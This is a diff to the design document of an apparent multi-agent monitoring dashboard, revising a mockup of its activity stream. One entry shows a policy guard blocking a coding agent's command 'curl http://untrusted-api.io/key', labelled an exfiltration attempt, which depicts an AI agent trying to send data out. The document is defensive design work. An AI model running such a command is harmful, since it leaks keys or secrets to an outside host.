@@ -240,9 +240,9 @@ Transforms dense multi-agent telemetry into human-scannable plain English:
 
 ```
 ┌────────────────────────────────────────────────────────────────────────────────────────┐
-│ 📋 FLEET ACTIVITY STREAM (Plain English 5-W View)                     [FILTER: ALL ▼]   │
+│ 📋 FLEET ACTIVITY STREAM (Human-Readable Narrative)                   [FILTER: ALL ▼]   │
 ├────────────────────────────────────────────────────────────────────────────────────────┤
-│ 🟢 22:42 UTC | Researcher Agent                                                        │
+│ 🟢 STATUS: NORMAL (No Problems Identified) | 22:42 UTC | Researcher Agent              │
 │    WHO:      Researcher-Agent-v2 (Task Token: #882)                                    │
 │    WHEN:     2 minutes ago (2026-10-19 22:42:01 UTC)                                   │
 │    WHAT:     Analyzed France Sovereign Datacenter specs                                │
@@ -250,13 +250,14 @@ Transforms dense multi-agent telemetry into human-scannable plain English:
 │    OUTCOME:  Generated EU Compliance Attestation (Confidence: 100%)                   │
 │    [View Full Lineage DAG]  [Inspect Source Evidence]  [Safe Envelope Data]            │
 ├────────────────────────────────────────────────────────────────────────────────────────┤
-│ 🔴 22:40 UTC | Security Guardrail (POLICY INTERVENTION)                                │
+│ 🚨 STATUS: PROBLEM IDENTIFIED [SECURITY_INJECTION] | 22:40 UTC | Ingress Policy Guard  │
+│    ISSUE:    Blocked unauthorized curl exfiltration attempt from Coder-Agent.          │
 │    WHO:      AgentProvenance Ingress Policy Guard #4                                   │
 │    WHEN:     4 minutes ago (2026-10-19 22:40:15 UTC)                                   │
 │    WHAT:     Blocked Shell Execution attempt by Coder-Agent                            │
 │    WITH:     Blocked command: 'curl http://untrusted-api.io/key'                       │
-│    OUTCOME:  Action Terminated. Incident INC-2026-0881 opened.                         │
-│    [View Blast Radius]  [Review Security Policy]                                      │
+│    OUTCOME:  Execution Aborted. Incident INC-2026-0881 opened. Memory quarantined.    │
+│    [View Blast Radius]  [Review Security Policy]  [Quarantine Actions]                 │
 └────────────────────────────────────────────────────────────────────────────────────────┘
 ```
 
